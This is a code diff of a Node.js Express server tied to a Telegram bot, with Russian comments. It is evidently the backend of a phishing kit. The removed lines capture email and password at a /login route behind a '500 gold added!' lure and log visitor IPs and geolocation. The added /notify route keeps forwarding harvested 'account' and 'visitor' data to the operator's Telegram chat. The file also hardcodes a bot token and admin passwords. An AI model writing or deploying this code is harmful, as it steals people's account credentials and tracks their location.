@@ -1,13 +1,11 @@
-const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
-const path = require('path');
-const app = express();
+const express = require('express');
 
-// ===== НАСТРОЙКИ =====
-const BOT_TOKEN = '8699335543:AAHUe_Ht9gCNI7cnBa3l6jvp315xTQKv0LQ';
+// ===== ТВОИ ДАННЫЕ =====
+const BOT_TOKEN = '8699335543:AAHUe_Ht9gCNI7cnBa3l6jvp315xTQKv0LQ'; // ← вставь свой
 const ADMIN_ID = 5015075680;
-const ADMIN_USER = 'Богдан';
-const ADMIN_PASS = '2282';
+const PORT = process.env.PORT || 3000;
+const SECRET = 'my_super_secret_2026'; // придумай свой пароль
 
 // ===== БОТ =====
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
@@ -20,7 +18,11 @@ bot.onText(/\/start/, (msg) => {
     );
 });
 
-// ===== ОТПРАВКА В TELEGRAM =====
+bot.onText(/\/test/, (msg) => {
+    bot.sendMessage(ADMIN_ID, '✅ Тест пройден, бот работает!');
+});
+
+// ===== ФУНКЦИИ ОТПРАВКИ =====
 function sendAccount(data) {
     const text =
         '🔐 *НОВЫЙ АККАУНТ*\n' +
@@ -48,61 +50,30 @@ function sendVisitor(data) {
         .catch(err => console.error('TG:', err.message));
 }
 
-// ===== EXPRESS =====
+// ===== HTTP-СЕРВЕР =====
+const app = express();
 app.use(express.json());
-app.use(express.static('public'));
 
-function auth(req, res, next) {
-    const b64 = (req.headers.authorization || '').split(' ')[1] || '';
-    const [user, pass] = Buffer.from(b64, 'base64').toString().split(':');
-    if (user === ADMIN_USER && pass === ADMIN_PASS) return next();
-    res.set('WWW-Authenticate', 'Basic realm="Admin"');
-    return res.status(401).send('Access denied');
-}
+// Приём данных с сайта
+app.post('/notify', (req, res) => {
+    const { type, secret, data } = req.body;
 
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
+    if (secret !== SECRET) {
+        return res.status(401).json({ error: 'unauthorized' });
+    }
 
-// ===== СБОР ПОСЕТИТЕЛЕЙ =====
-app.post('/collect', (req, res) => {
-    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');
-    const geo = req.body.geo || {};
-    const screen = req.body.screen || {};
-
-    console.log('👤 Посетитель: ' + ip + ' | ' + (geo.country || '?') + ', ' + (geo.city || '?'));
-
-    sendVisitor({
-        ip: ip,
-        country: geo.country,
-        city: geo.city,
-        org: geo.org,
-        screen: (screen.w || '?') + 'x' + (screen.h || '?')
-    });
+    if (type === 'account') {
+        sendAccount(data);
+    } else if (type === 'visitor') {
+        sendVisitor(data);
+    }
 
     res.json({ ok: true });
 });
 
-// ===== ЛОГИН =====
-app.post('/login', (req, res) => {
-    const { email, password } = req.body;
-    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');
-    const ua = req.headers['user-agent'] || 'unknown';
+// Проверка, что сервер жив
+app.get('/', (req, res) => res.send('Bot is running'));
 
-    if (!email || !password) return res.status(400).json({ error: 'Fill all fields' });
-
-    console.log('🔐 Аккаунт: ' + email + ' : ' + password);
-
-    sendAccount({ email, password, ip, user_agent: ua });
-
-    res.json({ success: true, message: '500 gold added!' });
-});
-
-// ===== АДМИНКА =====
-app.get('/admin', auth, (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
-});
-
-app.listen(3000, () => {
-    console.log('Server started on http://localhost:3000');
+app.listen(PORT, () => {
+    console.log('🚀 HTTP-сервер запущен на порту ' + PORT);
 });
